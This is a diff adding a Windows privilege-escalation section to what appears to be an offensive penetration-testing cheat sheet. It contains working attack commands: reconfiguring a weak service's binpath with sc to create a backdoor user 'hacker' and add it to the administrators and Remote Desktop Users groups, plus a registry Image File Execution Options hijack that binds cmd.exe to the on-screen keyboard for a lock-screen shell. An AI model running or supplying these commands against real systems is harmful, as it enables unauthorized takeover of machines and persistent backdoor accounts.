@@ -275,6 +275,40 @@ On victim machine:
 	
 # Privilege Escalation
 
+<b>Vulnerable Services</b>
+
+	accesschk.exe -uwcqv "Authenticated Users" * /accepteula
+	
+	sc qc <[VULNERABLE_SERVICE]>
+	
+	sc config <[VULNERABLE_SERVICE]> obj= ".\LocalSystem" password= ""
+	
+	sc config <[VULNERABLE_SERVICE]> start= "auto"
+	
+	sc config <[VULNERABLE_SERVICE]> binpath= "net user hacker Hacker123 /add"
+	
+	sc stop <[VULNERABLE_SERVICE]>
+	
+	sc start <[VULNERABLE_SERVICE]>
+	
+	sc config <[VULNERABLE_SERVICE]> binpath= "net localgroup administrator hacker /add"
+	
+	sc stop <[VULNERABLE_SERVICE]>
+	
+	sc start <[VULNERABLE_SERVICE]>
+	
+	sc config <[VULNERABLE_SERVICE]> binpath= "net localgroup \"Remote Desktop Users\" hacker /add"
+	
+	sc stop <[VULNERABLE_SERVICE]>
+	
+	sc start <[VULNERABLE_SERVICE]>
+
+<b>Win10:</b>
+
+	reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" /v "Debugger" /t REG_SZ /d "cmd.exe" /f 
+
+	Then ctrl+alt+canc and start virtual keyboard
+
 # Pass the hash
 
 	Export SMBHASH=<[HASH]>
